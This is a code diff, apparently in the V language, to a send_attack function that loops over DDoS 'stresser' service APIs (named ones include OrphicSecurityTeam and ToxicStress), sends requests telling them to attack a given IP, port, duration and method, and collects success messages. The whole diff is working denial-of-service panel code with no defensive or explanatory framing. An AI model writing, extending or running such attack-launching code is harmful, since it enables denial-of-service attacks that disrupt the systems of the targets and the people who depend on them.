@@ -20,7 +20,7 @@ pub fn (mut s API_Attack_Info) send_attack(usr string, ip string, port int, time
 				mut resp := ''
 				for api in apis { 
 					mut f := http.get(s.fix_api(api, ip, port, time, method)) or { panic("Failed to send attack") }
-					if api.contains("orphicsecurityteam") {
+					if api.contains("api.orphicsecurityteam.com") {
 						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | OrphicSecurityTeam\r\n"
 					} else if api.contains("toxicstress.live") {
 						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | ToxicStress\r\n"
@@ -31,10 +31,10 @@ pub fn (mut s API_Attack_Info) send_attack(usr string, ip string, port int, time
 					} else {
 						resp += "Attack successfully sent to ${ip}:${port} for ${time} with ${method}! | Error Pulling API Name\r\n"
 					}
-					println(f) // print response to make sure attack is going thru
+					// println(f) // print response to make sure attack is going thru
 				}
 				// attk_c.user_conn_up() // up the user on-going attk
-				return "Attack successfully sent to ${ip}:${port} for ${time} with ${method}!\r\n"
+				return resp
 			} else {
 				return "[x] Error, The time you've enter for attack (${time}) is over you're max time. Try again with less the time\r\n"
 			}
